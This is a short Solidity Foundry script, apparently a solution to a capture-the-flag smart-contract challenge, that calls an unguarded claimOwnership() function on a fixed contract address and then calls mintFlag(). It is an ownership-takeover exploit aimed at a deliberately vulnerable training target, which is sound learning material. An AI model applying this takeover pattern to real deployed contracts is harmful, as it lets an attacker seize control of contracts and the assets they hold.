// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";

interface Ichallenge {
    function mintFlag() external;
    function owner() external returns (address);
}

contract ChallengeSevenScript is Script {
    address constant CHALLENGE = 0xC962D4f4E772415475AA46Eed06cb1F2D4010c0A;

    function run() external {
        vm.startBroadcast();
        bytes memory callData = abi.encodeWithSignature("claimOwnership()");

        (bool success,) = CHALLENGE.call(callData);

        success;

        Ichallenge(CHALLENGE).mintFlag();
        vm.stopBroadcast();
    }
}
